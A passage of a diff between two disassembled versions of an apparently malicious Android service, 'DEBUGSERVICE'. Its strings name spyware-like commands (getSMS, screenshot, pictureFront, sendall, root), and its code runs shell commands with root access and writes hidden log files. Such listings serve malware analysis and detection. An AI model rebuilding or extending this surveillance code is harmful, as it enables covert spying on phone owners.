   + Methodref [com/android/classic/helper/e.<init> (Lcom/android/classic/helper/DEBUGSERVICE;)V]
   + Methodref [com/android/classic/helper/e.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
-  + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
   + Methodref [java/io/BufferedReader.<init> (Ljava/io/Reader;)V]
   + Methodref [java/io/BufferedReader.readLine ()Ljava/lang/String;]
   + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
@@ -39223,6 +39300,7 @@ Constant Pool (count = 289):
   + NameAndType [<init> (Ljava/io/InputStream;)V]
   + NameAndType [<init> (Ljava/io/Reader;)V]
   + NameAndType [<init> (Ljava/lang/String;)V]
+  + NameAndType [SDK_INT I]
   + NameAndType [a ()Z]
   + NameAndType [a (Ljava/lang/String;)Ljava/util/List;]
   + NameAndType [a Z]
@@ -39246,6 +39324,7 @@ Constant Pool (count = 289):
   + NameAndType [getExternalStorageDirectory ()Ljava/io/File;]
   + NameAndType [getMessage ()Ljava/lang/String;]
   + NameAndType [getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
+  + NameAndType [h ()V]
   + NameAndType [isConnected ()Z]
   + NameAndType [mkdirs ()Z]
   + NameAndType [onCreate ()V]
@@ -39290,8 +39369,11 @@ Constant Pool (count = 289):
   + Utf8 [<clinit>]
   + Utf8 [<init>]
   + Utf8 [Code]
+  + Utf8 [I]
   + Utf8 [Landroid/annotation/SuppressLint;]
+  + Utf8 [NewApi]
   + Utf8 [RuntimeInvisibleAnnotations]
+  + Utf8 [SDK_INT]
   + Utf8 [SU]
   + Utf8 [SimpleDateFormat]
   + Utf8 [StackMapTable]
@@ -39310,9 +39392,9 @@ Constant Pool (count = 289):
   + Utf8 [android/content/IntentFilter]
   + Utf8 [android/net/ConnectivityManager]
   + Utf8 [android/net/NetworkInfo]
+  + Utf8 [android/os/Build$VERSION]
   + Utf8 [android/os/Environment]
   + Utf8 [android/os/StrictMode]
-  + Utf8 [android/os/StrictMode$ThreadPolicy]
   + Utf8 [android/os/StrictMode$ThreadPolicy$Builder]
   + Utf8 [append]
   + Utf8 [audio]
@@ -39342,7 +39424,7 @@ Constant Pool (count = 289):
   + Utf8 [echo 'sleep 2' > /sdcard/Android/data/settings/Logger/bootup.txt]
   + Utf8 [echo 'sleep 3' > /sdcard/Android/data/settings/Logger/bootup.txt]
   + Utf8 [echo 'started Service' > /sdcard/Android/data/settings/Logger/bootup.txt]
-  + Utf8 [eu/chainfire/libsuperuser/c]
+  + Utf8 [eu/chainfire/libsuperuser/b]
   + Utf8 [execute]
   + Utf8 [f]
   + Utf8 [g]
@@ -39357,6 +39439,7 @@ Constant Pool (count = 289):
   + Utf8 [getMessage]
   + Utf8 [getSMS]
   + Utf8 [getSystemService]
+  + Utf8 [h]
   + Utf8 [install]
   + Utf8 [isConnected]
   + Utf8 [java/io/BufferedReader]
@@ -39382,6 +39465,7 @@ Constant Pool (count = 289):
   + Utf8 [pictureFront]
   + Utf8 [readLine]
   + Utf8 [registerReceiver]
+  + Utf8 [root]
   + Utf8 [screen_state]
   + Utf8 [screenshot]
   + Utf8 [sendall]
@@ -39395,14 +39479,14 @@ Fields (count = 1):
     Access flags: 0x9
       = public static java.lang.String[] a
 
-Methods (count = 13):
+Methods (count = 14):
   - Method:       <clinit>()V
     Access flags: 0x8
       = static void <clinit>()
     Class member attributes (count = 1):
-    + Code attribute instructions (code length = 111, locals = 0, stack = 4):
-      [0] bipush 18
-      [2] anewarray #65
+    + Code attribute instructions (code length = 117, locals = 0, stack = 4):
+      [0] bipush 19
+      [2] anewarray #66
         + Class [java/lang/String]
       [5] dup
       [6] iconst_0
@@ -39431,7 +39515,7 @@ Methods (count = 13):
       [29] aastore
       [30] dup
       [31] iconst_5
-      [32] ldc #42
+      [32] ldc #43
         + String [screenshot]
       [34] aastore
       [35] dup
@@ -39456,7 +39540,7 @@ Methods (count = 13):
       [58] aastore
       [59] dup
       [60] bipush 10
-      [62] ldc #43
+      [62] ldc #44
         + String [sendall]
       [64] aastore
       [65] dup
@@ -39494,9 +39578,14 @@ Methods (count = 13):
       [104] ldc #9
         + String [SU]
       [106] aastore
-      [107] putstatic #73
+      [107] dup
+      [108] bipush 18
+      [110] ldc #41
+        + String [root]
+      [112] aastore
+      [113] putstatic #75
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
-      [110] return
+      [116] return
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
   - Method:       <init>()V
@@ -39505,7 +39594,7 @@ Methods (count = 13):
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 5, locals = 1, stack = 1):
       [0] aload_0 v0
-      [1] invokespecial #75
+      [1] invokespecial #77
         + Methodref [android/app/Service.<init> ()V]
       [4] return
       Code attribute exceptions (count = 0):
@@ -39518,19 +39607,19 @@ Methods (count = 13):
       [0] aload_0 v0
       [1] ldc #17
         + String [connectivity]
-      [3] invokevirtual #94
+      [3] invokevirtual #96
         + Methodref [com/android/classic/helper/DEBUGSERVICE.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
-      [6] checkcast #47
+      [6] checkcast #48
         + Class [android/net/ConnectivityManager]
       [9] astore_1 v1
       [10] aload_1 v1
-      [11] invokevirtual #80
+      [11] invokevirtual #82
         + Methodref [android/net/ConnectivityManager.getActiveNetworkInfo ()Landroid/net/NetworkInfo;]
       [14] astore_2 v2
       [15] aload_2 v2
       [16] ifnull +12 (target=28)
       [19] aload_2 v2
-      [20] invokevirtual #81
+      [20] invokevirtual #83
         + Methodref [android/net/NetworkInfo.isConnected ()Z]
       [23] ifeq +5 (target=28)
       [26] iconst_1
@@ -39545,257 +39634,269 @@ Methods (count = 13):
     Access flags: 0x1
       = public int onStartCommand(android.content.Intent,int,int)
     Class member attributes (count = 1):
-    + Code attribute instructions (code length = 93, locals = 5, stack = 3):
-      [0] new #52
-        + Class [android/os/StrictMode$ThreadPolicy$Builder]
-      [3] dup
-      [4] invokespecial #84
-        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.<init> ()V]
-      [7] invokevirtual #86
-        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.permitAll ()Landroid/os/StrictMode$ThreadPolicy$Builder;]
-      [10] invokevirtual #85
-        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.build ()Landroid/os/StrictMode$ThreadPolicy;]
-      [13] astore v4
-      [15] aload v4
-      [17] invokestatic #83
-        + Methodref [android/os/StrictMode.setThreadPolicy (Landroid/os/StrictMode$ThreadPolicy;)V]
-      [20] getstatic #74
+    + Code attribute instructions (code length = 77, locals = 5, stack = 3):
+      [0] aload_0 v0
+      [1] invokespecial #91
+        + Methodref [com/android/classic/helper/DEBUGSERVICE.c ()V]
+      [4] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
-      [23] ifeq +9 (target=32)
-      [26] ldc #30
+      [7] ifeq +9 (target=16)
+      [10] ldc #30
         + String [echo 'started Service' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [28] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
-      [31] pop
-      [32] aload_0 v0
-      [33] invokespecial #91
-        + Methodref [com/android/classic/helper/DEBUGSERVICE.e ()V]
-      [36] aload_1 v1
-      [37] ldc #41
-        + String [screen_state]
-      [39] iconst_0
-      [40] invokevirtual #77
-        + Methodref [android/content/Intent.getBooleanExtra (Ljava/lang/String;Z)Z]
-      [43] ifne +10 (target=53)
-      [46] aload_0 v0
-      [47] invokespecial #93
-        + Methodref [com/android/classic/helper/DEBUGSERVICE.g ()V]
-      [50] goto +41 (target=91)
-      [53] aload_0 v0
-      [54] invokespecial #92
+      [12] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+      [15] pop
+      [16] aload_0 v0
+      [17] invokespecial #94
         + Methodref [com/android/classic/helper/DEBUGSERVICE.f ()V]
-      [57] goto +34 (target=91)
-      [60] astore v4
-      [62] new #66
+      [20] aload_1 v1
+      [21] ldc #42
+        + String [screen_state]
+      [23] iconst_0
+      [24] invokevirtual #79
+        + Methodref [android/content/Intent.getBooleanExtra (Ljava/lang/String;Z)Z]
+      [27] ifne +10 (target=37)
+      [30] aload_0 v0
+      [31] invokespecial #97
+        + Methodref [com/android/classic/helper/DEBUGSERVICE.h ()V]
+      [34] goto +41 (target=75)
+      [37] aload_0 v0
+      [38] invokespecial #95
+        + Methodref [com/android/classic/helper/DEBUGSERVICE.g ()V]
+      [41] goto +34 (target=75)
+      [44] astore v4
+      [46] new #67
         + Class [java/lang/StringBuilder]
-      [65] dup
-      [66] ldc #19
+      [49] dup
+      [50] ldc #19
         + String [echo 'On Start | ]
-      [68] invokespecial #112
+      [52] invokespecial #115
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [71] aload v4
-      [73] invokevirtual #109
+      [55] aload v4
+      [57] invokevirtual #112
         + Methodref [java/lang/Exception.getMessage ()Ljava/lang/String;]
-      [76] invokevirtual #114
+      [60] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [79] ldc #1
+      [63] ldc #1
         + String [' >> /sdcard/Android/data/settings/Logger/CRASH.txt]
-      [81] invokevirtual #114
+      [65] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [84] invokevirtual #115
+      [68] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [87] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
-      [90] pop
-      [91] iconst_1
-      [92] ireturn
+      [71] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+      [74] pop
+      [75] iconst_1
+      [76] ireturn
       Code attribute exceptions (count = 1):
-      - ExceptionInfo (0 -> 57: 60):
+      - ExceptionInfo (0 -> 41: 44):
       + Class [java/lang/Exception]
       Code attribute attributes (attribute count = 1):
       + Stack map table attribute (count = 5):
-        - [32] Var: ...[a:android/os/StrictMode$ThreadPolicy], Stack: (empty)
-        - [53] Var: ..., Stack: (empty)
-        - [57] Var: -1, Stack: (empty)
-        - [60] Var: ..., Stack: [a:java/lang/Exception]
-        - [91] Var: ..., Stack: (empty)
+        - [16] Var: ..., Stack: (empty)
+        - [37] Var: ..., Stack: (empty)
+        - [41] Var: ..., Stack: (empty)
+        - [44] Var: ..., Stack: [a:java/lang/Exception]
+        - [75] Var: ..., Stack: (empty)
   + Method:       onCreate()V
     Access flags: 0x1
       = public void onCreate()
     Class member attributes (count = 1):
-    + Code attribute instructions (code length = 86, locals = 4, stack = 3):
+    + Code attribute instructions (code length = 72, locals = 3, stack = 3):
       [0] aload_0 v0
-      [1] invokespecial #76
+      [1] invokespecial #78
         + Methodref [android/app/Service.onCreate ()V]
-      [4] new #52
-        + Class [android/os/StrictMode$ThreadPolicy$Builder]
-      [7] dup
-      [8] invokespecial #84
-        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.<init> ()V]
-      [11] invokevirtual #86
-        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.permitAll ()Landroid/os/StrictMode$ThreadPolicy$Builder;]
-      [14] invokevirtual #85
-        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.build ()Landroid/os/StrictMode$ThreadPolicy;]
+      [4] aload_0 v0
+      [5] invokespecial #91
+        + Methodref [com/android/classic/helper/DEBUGSERVICE.c ()V]
+      [8] new #47
+        + Class [android/content/IntentFilter]
+      [11] dup
+      [12] ldc #15
+        + String [android.intent.action.SCREEN_ON]
+      [14] invokespecial #80
+        + Methodref [android/content/IntentFilter.<init> (Ljava/lang/String;)V]
       [17] astore_1 v1
       [18] aload_1 v1
-      [19] invokestatic #83
-        + Methodref [android/os/StrictMode.setThreadPolicy (Landroid/os/StrictMode$ThreadPolicy;)V]
-      [22] new #46
-        + Class [android/content/IntentFilter]
-      [25] dup
-      [26] ldc #15
-        + String [android.intent.action.SCREEN_ON]
-      [28] invokespecial #78
-        + Methodref [android/content/IntentFilter.<init> (Ljava/lang/String;)V]
-      [31] astore_2 v2
-      [32] aload_2 v2
-      [33] ldc #14
+      [19] ldc #14
         + String [android.intent.action.SCREEN_OFF]
-      [35] invokevirtual #79
+      [21] invokevirtual #81
         + Methodref [android/content/IntentFilter.addAction (Ljava/lang/String;)V]
-      [38] new #54
+      [24] new #55
         + Class [com/android/classic/helper/ScreenReceiver]
-      [41] dup
-      [42] invokespecial #96
+      [27] dup
+      [28] invokespecial #99
         + Methodref [com/android/classic/helper/ScreenReceiver.<init> ()V]
-      [45] astore_3 v3
-      [46] aload_0 v0
-      [47] aload_3 v3
-      [48] aload_2 v2
-      [49] invokevirtual #95
+      [31] astore_2 v2
+      [32] aload_0 v0
+      [33] aload_2 v2
+      [34] aload_1 v1
+      [35] invokevirtual #98
         + Methodref [com/android/classic/helper/DEBUGSERVICE.registerReceiver (Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;]
-      [52] pop
-      [53] goto +32 (target=85)
-      [56] astore_1 v1
-      [57] new #66
+      [38] pop
+      [39] goto +32 (target=71)
+      [42] astore_1 v1
+      [43] new #67
         + Class [java/lang/StringBuilder]
-      [60] dup
-      [61] ldc #20
+      [46] dup
+      [47] ldc #20
         + String [echo 'OnCreate | ]
-      [63] invokespecial #112
+      [49] invokespecial #115
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [66] aload_1 v1
-      [67] invokevirtual #109
+      [52] aload_1 v1
+      [53] invokevirtual #112
         + Methodref [java/lang/Exception.getMessage ()Ljava/lang/String;]
-      [70] invokevirtual #114
+      [56] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [73] ldc #1
+      [59] ldc #1
         + String [' >> /sdcard/Android/data/settings/Logger/CRASH.txt]
-      [75] invokevirtual #114
+      [61] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [78] invokevirtual #115
+      [64] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [81] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
-      [84] pop
-      [85] return
+      [67] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+      [70] pop
+      [71] return
       Code attribute exceptions (count = 1):
-      - ExceptionInfo (4 -> 53: 56):
+      - ExceptionInfo (4 -> 39: 42):
       + Class [java/lang/Exception]
       Code attribute attributes (attribute count = 1):
       + Stack map table attribute (count = 2):
-        - [56] Var: ..., Stack: [a:java/lang/Exception]
-        - [85] Var: ..., Stack: (empty)
+        - [42] Var: ..., Stack: [a:java/lang/Exception]
+        - [71] Var: ..., Stack: (empty)
+  + Method:       c()V
+    Access flags: 0x2
+      = private void c()
+    Class member attributes (count = 2):
+    + Code attribute instructions (code length = 27, locals = 2, stack = 2):
+      [0] getstatic #74
+        + Fieldref [android/os/Build$VERSION.SDK_INT I]
+      [3] bipush 9
+      [5] ificmplt +21 (target=26)
+      [8] new #53
+        + Class [android/os/StrictMode$ThreadPolicy$Builder]
+      [11] dup
+      [12] invokespecial #86
+        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.<init> ()V]
+      [15] invokevirtual #88
+        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.permitAll ()Landroid/os/StrictMode$ThreadPolicy$Builder;]
+      [18] invokevirtual #87
+        + Methodref [android/os/StrictMode$ThreadPolicy$Builder.build ()Landroid/os/StrictMode$ThreadPolicy;]
+      [21] astore_1 v1
+      [22] aload_1 v1
+      [23] invokestatic #85
+        + Methodref [android/os/StrictMode.setThreadPolicy (Landroid/os/StrictMode$ThreadPolicy;)V]
+      [26] return
+      Code attribute exceptions (count = 0):
+      Code attribute attributes (attribute count = 1):
+      + Stack map table attribute (count = 1):
+        - [26] Var: ..., Stack: (empty)
+    + Runtime invisible annotations attribute:
+      - Annotation [Landroid/annotation/SuppressLint;]:
+        - Array element value [value]:
+          + Constant element value [(default) '115']
+            + Utf8 [NewApi]
   + Method:       b()V
     Access flags: 0x1
       = public void b()
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 142, locals = 2, stack = 3):
       [0] aload_0 v0
-      [1] invokespecial #91
-        + Methodref [com/android/classic/helper/DEBUGSERVICE.e ()V]
+      [1] invokespecial #94
+        + Methodref [com/android/classic/helper/DEBUGSERVICE.f ()V]
       [4] aload_0 v0
-      [5] invokevirtual #87
+      [5] invokevirtual #89
         + Methodref [com/android/classic/helper/DEBUGSERVICE.a ()Z]
       [8] ifeq +133 (target=141)
-      [11] getstatic #74
+      [11] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [14] ifeq +9 (target=23)
       [17] ldc #27
         + String [echo 'sleep 1' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [19] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [19] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [22] pop
-      [23] ldc2_w #71
+      [23] ldc2_w #72
         + Long [300]
-      [26] invokestatic #116
+      [26] invokestatic #119
         + Methodref [java/lang/Thread.sleep (J)V]
-      [29] getstatic #74
+      [29] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [32] ifeq +9 (target=41)
       [35] ldc #23
         + String [echo 'check Device' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [37] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [37] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [40] pop
       [41] aload_0 v0
-      [42] invokespecial #90
-        + Methodref [com/android/classic/helper/DEBUGSERVICE.d ()V]
-      [45] getstatic #74
+      [42] invokespecial #93
+        + Methodref [com/android/classic/helper/DEBUGSERVICE.e ()V]
+      [45] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [48] ifeq +9 (target=57)
       [51] ldc #28
         + String [echo 'sleep 2' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [53] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [53] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [56] pop
-      [57] ldc2_w #71
+      [57] ldc2_w #72
         + Long [300]
-      [60] invokestatic #116
+      [60] invokestatic #119
         + Methodref [java/lang/Thread.sleep (J)V]
-      [63] getstatic #74
+      [63] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [66] ifeq +9 (target=75)
       [69] ldc #24
         + String [echo 'check cmd' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [71] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [71] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [74] pop
       [75] aload_0 v0
-      [76] invokespecial #89
-        + Methodref [com/android/classic/helper/DEBUGSERVICE.c ()V]
-      [79] getstatic #74
+      [76] invokespecial #92
+        + Methodref [com/android/classic/helper/DEBUGSERVICE.d ()V]
+      [79] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [82] ifeq +9 (target=91)
       [85] ldc #29
         + String [echo 'sleep 3' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [87] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [87] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [90] pop
-      [91] ldc2_w #71
+      [91] ldc2_w #72
         + Long [300]
-      [94] invokestatic #116
+      [94] invokestatic #119
         + Methodref [java/lang/Thread.sleep (J)V]
-      [97] getstatic #74
+      [97] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [100] ifeq +41 (target=141)
       [103] ldc #25
         + String [echo 'done' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [105] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [105] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [108] pop
       [109] goto +32 (target=141)
       [112] astore_1 v1
-      [113] new #66
+      [113] new #67
         + Class [java/lang/StringBuilder]
       [116] dup
       [117] ldc #18
         + String [echo 'Do All | ]
-      [119] invokespecial #112
+      [119] invokespecial #115
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [122] aload_1 v1
-      [123] invokevirtual #110
+      [123] invokevirtual #113
         + Methodref [java/lang/Exception.toString ()Ljava/lang/String;]
-      [126] invokevirtual #114
+      [126] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [129] ldc #1
         + String [' >> /sdcard/Android/data/settings/Logger/CRASH.txt]
-      [131] invokevirtual #114
+      [131] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [134] invokevirtual #115
+      [134] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [137] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [137] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [140] pop
       [141] return
       Code attribute exceptions (count = 1):
@@ -39821,25 +39922,25 @@ Methods (count = 13):
       [2] aconst_null
       [3] astore_3 v3
       [4] aload_1 v1
-      [5] invokeinterface #117
+      [5] invokeinterface #120
         + InterfaceMethodref [org/apache/http/HttpEntity.getContent ()Ljava/io/InputStream;]
       [10] astore_2 v2
-      [11] new #59
+      [11] new #60
         + Class [java/io/BufferedReader]
       [14] dup
-      [15] new #63
+      [15] new #64
         + Class [java/io/InputStreamReader]
       [18] dup
       [19] aload_2 v2
-      [20] invokespecial #108
+      [20] invokespecial #111
         + Methodref [java/io/InputStreamReader.<init> (Ljava/io/InputStream;)V]
-      [23] invokespecial #102
+      [23] invokespecial #105
         + Methodref [java/io/BufferedReader.<init> (Ljava/io/Reader;)V]
       [26] astore v4
-      [28] new #66
+      [28] new #67
         + Class [java/lang/StringBuilder]
       [31] dup
-      [32] invokespecial #111
+      [32] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
       [35] astore_3 v3
       [36] aconst_null
@@ -39847,11 +39948,11 @@ Methods (count = 13):
       [39] goto +10 (target=49)
       [42] aload_3 v3
       [43] aload v5
-      [45] invokevirtual #114
+      [45] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [48] pop
       [49] aload v4
-      [51] invokevirtual #103
+      [51] invokevirtual #106
         + Methodref [java/io/BufferedReader.readLine ()Ljava/lang/String;]
       [54] dup
       [55] astore v5
@@ -39859,26 +39960,26 @@ Methods (count = 13):
       [60] goto +31 (target=91)
       [63] astore v4
       [65] aload_2 v2
-      [66] invokevirtual #107
+      [66] invokevirtual #110
         + Methodref [java/io/InputStream.close ()V]
       [69] goto +31 (target=100)
       [72] astore v7
       [74] goto +26 (target=100)
       [77] astore v6
       [79] aload_2 v2
-      [80] invokevirtual #107
+      [80] invokevirtual #110
         + Methodref [java/io/InputStream.close ()V]
       [83] goto +5 (target=88)
       [86] astore v7
       [88] aload v6
       [90] athrow
       [91] aload_2 v2
-      [92] invokevirtual #107
+      [92] invokevirtual #110
         + Methodref [java/io/InputStream.close ()V]
       [95] goto +5 (target=100)
       [98] astore v7
       [100] aload_3 v3
-      [101] invokevirtual #115
+      [101] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [104] areturn
       Code attribute exceptions (count = 5):
@@ -39904,61 +40005,32 @@ Methods (count = 13):
         - [91] Var: [a:com/android/classic/helper/DEBUGSERVICE][a:org/apache/http/HttpEntity][a:java/io/InputStream][a:java/lang/StringBuilder], Stack: 
         - [98] Var: ..., Stack: [a:java/io/IOException]
         - [100] Var: ..., Stack: (empty)
-  + Method:       c()V
-    Access flags: 0x2
-      = private void c()
-    Class member attributes (count = 1):
-    + Code attribute instructions (code length = 29, locals = 1, stack = 3):
-      [0] getstatic #74
-        + Fieldref [com/android/classic/helper/d.a Z]
-      [3] ifeq +9 (target=12)
-      [6] ldc #22
-        + String [echo 'check CMD' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [8] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
-      [11] pop
-      [12] new #57
-        + Class [com/android/classic/helper/e]
-      [15] dup
-      [16] aload_0 v0
-      [17] invokespecial #99
-        + Methodref [com/android/classic/helper/e.<init> (Lcom/android/classic/helper/DEBUGSERVICE;)V]
-      [20] iconst_0
-      [21] anewarray #69
-        + Class [java/lang/Void]
-      [24] invokevirtual #100
-        + Methodref [com/android/classic/helper/e.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
-      [27] pop
-      [28] return
-      Code attribute exceptions (count = 0):
-      Code attribute attributes (attribute count = 1):
-      + Stack map table attribute (count = 1):
-        - [12] Var: ..., Stack: (empty)
   + Method:       d()V
     Access flags: 0x2
       = private void d()
     Class member attributes (count = 1):
-    + Code attribute instructions (code length = 28, locals = 1, stack = 2):
-      [0] getstatic #74
+    + Code attribute instructions (code length = 29, locals = 1, stack = 3):
+      [0] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [3] ifeq +9 (target=12)
-      [6] ldc #23
-        + String [echo 'check Device' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [8] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [6] ldc #22
+        + String [echo 'check CMD' > /sdcard/Android/data/settings/Logger/bootup.txt]
+      [8] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [11] pop
-      [12] new #55
-        + Class [com/android/classic/helper/a]
+      [12] new #58
+        + Class [com/android/classic/helper/e]
       [15] dup
-      [16] invokespecial #97
-        + Methodref [com/android/classic/helper/a.<init> ()V]
-      [19] iconst_0
-      [20] anewarray #69
+      [16] aload_0 v0
+      [17] invokespecial #102
+        + Methodref [com/android/classic/helper/e.<init> (Lcom/android/classic/helper/DEBUGSERVICE;)V]
+      [20] iconst_0
+      [21] anewarray #70
         + Class [java/lang/Void]
-      [23] invokevirtual #98
-        + Methodref [com/android/classic/helper/a.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
-      [26] pop
-      [27] return
+      [24] invokevirtual #103
+        + Methodref [com/android/classic/helper/e.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [27] pop
+      [28] return
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 1):
       + Stack map table attribute (count = 1):
@@ -39967,188 +40039,217 @@ Methods (count = 13):
     Access flags: 0x2
       = private void e()
     Class member attributes (count = 1):
+    + Code attribute instructions (code length = 28, locals = 1, stack = 2):
+      [0] getstatic #76
+        + Fieldref [com/android/classic/helper/d.a Z]
+      [3] ifeq +9 (target=12)
+      [6] ldc #23
+        + String [echo 'check Device' > /sdcard/Android/data/settings/Logger/bootup.txt]
+      [8] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+      [11] pop
+      [12] new #56
+        + Class [com/android/classic/helper/a]
+      [15] dup
+      [16] invokespecial #100
+        + Methodref [com/android/classic/helper/a.<init> ()V]
+      [19] iconst_0
+      [20] anewarray #70
+        + Class [java/lang/Void]
+      [23] invokevirtual #101
+        + Methodref [com/android/classic/helper/a.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [26] pop
+      [27] return
+      Code attribute exceptions (count = 0):
+      Code attribute attributes (attribute count = 1):
+      + Stack map table attribute (count = 1):
+        - [12] Var: ..., Stack: (empty)
+  + Method:       f()V
+    Access flags: 0x2
+      = private void f()
+    Class member attributes (count = 1):
     + Code attribute instructions (code length = 264, locals = 9, stack = 4):
-      [0] getstatic #74
+      [0] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [3] ifeq +9 (target=12)
       [6] ldc #26
         + String [echo 'set up' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [8] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [8] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [11] pop
-      [12] new #60
+      [12] new #61
         + Class [java/io/File]
       [15] dup
-      [16] new #66
+      [16] new #67
         + Class [java/lang/StringBuilder]
       [19] dup
-      [20] invokespecial #111
+      [20] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [23] invokestatic #82
